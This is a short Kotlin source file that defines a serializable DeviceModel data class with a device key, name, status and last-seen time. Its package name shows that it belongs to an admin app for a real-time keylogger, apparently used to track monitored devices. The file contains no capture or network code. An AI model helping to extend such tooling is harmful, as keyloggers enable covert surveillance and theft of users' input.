package com.shubhamgupta16.realtimekeyloggeradmin.models

import java.io.Serializable

data class DeviceModel(
    val deviceKey: String,
    val name: String,
    val status: Int,
    val lastSeen: Long
) : Serializable {
    constructor() : this("", "", 0, 0)
}
